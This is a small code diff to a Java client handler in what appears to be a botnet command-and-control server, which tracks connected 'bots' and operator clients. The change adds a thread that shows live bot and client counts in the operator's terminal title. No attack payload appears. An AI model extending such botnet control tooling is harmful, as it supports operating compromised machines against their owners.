@@ -19,9 +19,10 @@ public class ClientHandler implements Runnable {
         writer.flush();
     }
 
+    private volatile boolean connected = false;
+
     public String accessKey;
     private Socket socket;
-
     public ClientHandler(Socket socket) {
         this.socket = socket;
     }
@@ -45,11 +46,27 @@ public class ClientHandler implements Runnable {
             }
 
             writeToClient(Utilities.Colour.CLEAR.get() + Utilities.Colour.GREEN.get() + "Successfully Authenticated your Access-Key...", writer);
+            connected = true;
             Main.connectedClients.add(socket);
             Utilities.sendJoinMessage(ConnectionType.CLIENT, null, socket);
             Thread.sleep(1900);
             writeToClient(Utilities.Colour.CLEAR.get(), writer);
-            Utilities.setTerminalName(Main.name + " Network", writer);
+            new Thread(){
+                @Override
+                public void run() {
+                    while(connected){
+                        try{
+                            // will provide the DYNAMIC number of connected devices and clients on the cnc in the terminal tab name.
+                            Utilities.setTerminalName(Main.name + " Network | ["+Main.connectedBots.size()+"]  ["+Main.connectedClients.size()+"]", writer);
+                            Thread.sleep(20);
+                        }catch (Exception e){
+
+                        }
+                    }
+                }
+            }.start();
+
+
 
             while(Main.isRunning){
                 try {
@@ -83,6 +100,7 @@ public class ClientHandler implements Runnable {
         }catch (Exception e){
 
         }finally {
+            connected = false;
             if (Main.connectedClients.contains(this.socket)){
                 Main.connectedClients.remove(this.socket);
                 System.out.println(Utilities.Colour.YELLOW.get() + "[Client] " + Utilities.Colour.RESET.get() + "Client Disconnected @" + socket.getInetAddress().getHostAddress() + "...");
